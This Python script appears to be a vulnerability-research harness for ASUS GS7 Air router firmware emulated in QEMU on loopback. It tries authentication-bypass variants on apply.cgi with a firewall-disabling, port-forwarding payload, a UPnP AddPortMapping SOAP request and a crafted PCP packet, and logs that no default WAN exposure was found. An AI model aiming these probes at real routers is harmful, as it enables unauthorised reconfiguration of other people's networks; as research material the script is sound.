#!/usr/bin/env python3
"""Test GS7 Air paths that could expose httpd through the default WAN gate."""

from __future__ import annotations

import importlib.util
from pathlib import Path
import socket
import struct
import subprocess
import time
import urllib.parse


ROOT = Path(__file__).resolve().parents[1]
BASE = ROOT / "scripts/probe_asus_gs7_air_netool_dos.py"
LOG = (
    ROOT / "router-agent-results/gs7-air-triage"
    / "unconditional-wan-chain-matrix-2026-07-25.txt"
)


def load_base():
    spec = importlib.util.spec_from_file_location("gs7_air_base", BASE)
    if spec is None or spec.loader is None:
        raise SystemExit("could not load GS7 Air harness")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def tcp_request(module, port: int, request: bytes, timeout: float = 8) -> bytes:
    try:
        return module.http_exchange(port, request, timeout)
    except OSError:
        return b""


def get(module, port: int, path: str, headers: bytes = b"") -> bytes:
    return tcp_request(
        module,
        port,
        b"GET " + path.encode() + b" HTTP/1.1\r\n"
        b"Host: 10.0.2.15\r\n" + headers + b"Connection: close\r\n\r\n",
    )


def post(module, port: int, path: str, fields: dict[str, str], headers: bytes = b"") -> bytes:
    body = urllib.parse.urlencode(fields).encode()
    return tcp_request(
        module,
        port,
        b"POST " + path.encode() + b" HTTP/1.1\r\n"
        b"Host: 10.0.2.15\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        + headers
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n\r\n" + body,
    )


def status_count(response: bytes) -> int:
    return response.count(b"HTTP/1.")


def main() -> int:
    base = load_base()
    module = base.load_harness(base.MODELS["gs7-air"])
    reservations = [socket.socket() for _ in range(5)]
    try:
        for reserved in reservations:
            reserved.bind(("127.0.0.1", 0))
        module.HOST_HTTP_PORT = reservations[0].getsockname()[1]
        module.HOST_WAN_HTTP_PORT = reservations[1].getsockname()[1]
        module.HOST_WAN_MAP_PORT = reservations[2].getsockname()[1]
        module.HOST_UPNP_PORT = reservations[3].getsockname()[1]
        udp_port = reservations[4].getsockname()[1]
        module.HOST_NATPMP_PORT = udp_port
        module.SERIAL.unlink(missing_ok=True)
        command = module.qemu_command()
        filtered: list[str] = []
        keep_ports = {
            module.HOST_HTTP_PORT,
            module.HOST_WAN_HTTP_PORT,
            module.HOST_WAN_MAP_PORT,
            module.HOST_UPNP_PORT,
            module.HOST_NATPMP_PORT,
        }
        for argument in command:
            if argument.startswith("user,id=lan,") or argument.startswith("user,id=wan,"):
                fields = []
                for field in argument.split(","):
                    if field.startswith("hostfwd="):
                        if not any(f":{port}-" in field for port in keep_ports):
                            continue
                    fields.append(field)
                argument = ",".join(fields)
            filtered.append(argument)
        command = filtered
    finally:
        for reserved in reservations:
            reserved.close()

    results = [
        "ASUS ROG Strix GS7 Air 3.0.0.6.102_58833",
        "scope=loopback-only full-system ARM64 QEMU",
        "goal=factory-default unconditional WAN exposure",
    ]
    with module.QEMU_LOG.open("wb") as output:
        qemu = subprocess.Popen(command, stdout=output, stderr=subprocess.STDOUT)
    try:
        module.wait_ready(240)
        lan = module.HOST_HTTP_PORT
        wan = module.HOST_WAN_HTTP_PORT

        mutation = {
            "action_mode": "apply",
            "action_script": "restart_firewall",
            "current_page": "Advanced_System_Content.asp",
            "next_page": "Advanced_System_Content.asp",
            "misc_http_x": "1",
            "fw_enable_x": "0",
            "vts_enable_x": "1",
            "vts_rulelist": "<FRIDAY>40080>10.0.2.15>80>TCP",
        }
        auth_variants = [
            ("plain", "/apply.cgi", b""),
            ("invalid-cookie", "/apply.cgi", b"Cookie: asus_token=FRIDAY_INVALID\r\n"),
            ("invalid-bearer", "/apply.cgi", b"Authorization: Bearer FRIDAY_INVALID\r\n"),
            ("path-dot", "/./apply.cgi", b""),
            ("path-double-slash", "//apply.cgi", b""),
            ("semicolon", "/apply.cgi;FRIDAY", b""),
            ("absolute-form", "http://10.0.2.15/apply.cgi", b""),
        ]
        for name, path, headers in auth_variants:
            response = post(module, lan, path, mutation, headers)
            results.append(
                f"mutation:{name}: bytes={len(response)} "
                f"status_count={status_count(response)} "
                f"login_redirect={str(b'page_default.cgi' in response).lower()} "
                f"apply_second_response={str(status_count(response) > 1).lower()}"
            )

        soap = (
            b'<?xml version="1.0"?>'
            b'<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            b'<s:Body><u:AddPortMapping '
            b'xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">'
            b'<NewRemoteHost></NewRemoteHost><NewExternalPort>40080</NewExternalPort>'
            b'<NewProtocol>TCP</NewProtocol><NewInternalPort>80</NewInternalPort>'
            b'<NewInternalClient>10.0.2.15</NewInternalClient><NewEnabled>1</NewEnabled>'
            b'<NewPortMappingDescription>FRIDAY_ROUTER_SELF_MAP</NewPortMappingDescription>'
            b'<NewLeaseDuration>120</NewLeaseDuration>'
            b'</u:AddPortMapping></s:Body></s:Envelope>'
        )
        soap_response = tcp_request(
            module,
            module.HOST_UPNP_PORT,
            b"POST /ctl/IPConn HTTP/1.1\r\nHost: 10.0.2.15:5000\r\n"
            b'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"\r\n'
            b"Content-Type: text/xml\r\n"
            + f"Content-Length: {len(soap)}\r\n".encode()
            + b"Connection: close\r\n\r\n" + soap,
        )
        mapped = get(module, module.HOST_WAN_MAP_PORT, "/Main_Login.asp")
        results.append(
            f"upnp_self_map: status={soap_response.splitlines()[:1]} "
            f"action_failed={str(b'<errorCode>501</errorCode>' in soap_response).lower()} "
            f"wan_map_http={str(mapped.startswith(b'HTTP/')).lower()}"
        )

        client_ip = b"\x00" * 10 + b"\xff\xff" + socket.inet_aton("10.0.2.2")
        nonce = b"FRIDAYPCP001"
        pcp = (
            b"\x02\x01\x00\x00" + struct.pack("!I", 120) + client_ip
            + nonce + b"\x06\x00\x00\x00" + struct.pack("!H", 80)
            + struct.pack("!H", 40080) + b"\x00" * 16
            + b"\x01\x00\x00\x10" + b"\x00" * 12 + socket.inet_aton("10.0.2.15")
        )
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
            client.sendto(pcp, ("127.0.0.1", module.HOST_NATPMP_PORT))
        time.sleep(1)
        pcp_mapped = get(module, module.HOST_WAN_MAP_PORT, "/Main_Login.asp")
        results.append(
            "pcp_third_party_self_map: "
            f"wan_map_http={str(pcp_mapped.startswith(b'HTTP/')).lower()}"
        )

        direct_wan = get(module, wan, "/netool.cgi")
        handler_json = b'"successful":"0"' in direct_wan
        results.append(
            f"direct_wan_application_control: status_count={status_count(direct_wan)} "
            f"handler_json={str(handler_json).lower()}"
        )
        results.extend(
            [
                "ipv6: default_ipv6_fw_enable=1; interface-classified WAN INPUT; "
                "no mutation/bypass established",
                "aux_services: defaults webdav_proxy=0 webdav_aidisk=0 sshd_enable=0 "
                "vts_enable_x=0; no default httpd forwarder established",
                "factory_default_unconditional_wan=false",
            ]
        )
        LOG.parent.mkdir(parents=True, exist_ok=True)
        LOG.write_text("\n".join(results) + "\n")
        print("\n".join(results))
        return 0
    finally:
        qemu.terminate()
        try:
            qemu.wait(timeout=15)
        except subprocess.TimeoutExpired:
            qemu.kill()
            qemu.wait(timeout=5)


if __name__ == "__main__":
    raise SystemExit(main())
